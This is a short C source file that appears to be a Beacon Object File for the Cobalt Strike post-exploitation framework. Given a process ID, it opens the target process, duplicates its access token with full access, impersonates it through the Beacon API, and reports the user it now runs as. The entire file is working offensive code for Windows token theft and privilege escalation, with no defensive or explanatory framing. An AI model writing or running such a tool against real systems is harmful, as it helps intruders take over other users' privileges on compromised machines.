#include <windows.h>
#include "beacon.h"
void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    int targetPid = BeaconDataInt(&parser);
    if (targetPid <= 0) { BeaconPrintf(CALLBACK_ERROR, "[!] Invalid PID\n"); return; }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Stealing token from PID %d...\n", targetPid);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, targetPid);
    if (!hProcess) { BeaconPrintf(CALLBACK_ERROR, "[!] OpenProcess failed (gle=%lu)\n", (unsigned long)GetLastError()); return; }
    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) { CloseHandle(hProcess); return; }
    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
        CloseHandle(hToken); CloseHandle(hProcess); return;
    }
    if (!BeaconUseToken(hDupToken)) { CloseHandle(hDupToken); CloseHandle(hToken); CloseHandle(hProcess); return; }
    char userName[256]={0}; DWORD nameLen=sizeof(userName);
    if (GetUserNameA(userName, &nameLen))
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Token stolen — now running as: %s\n", userName);
    CloseHandle(hToken); CloseHandle(hProcess);
}
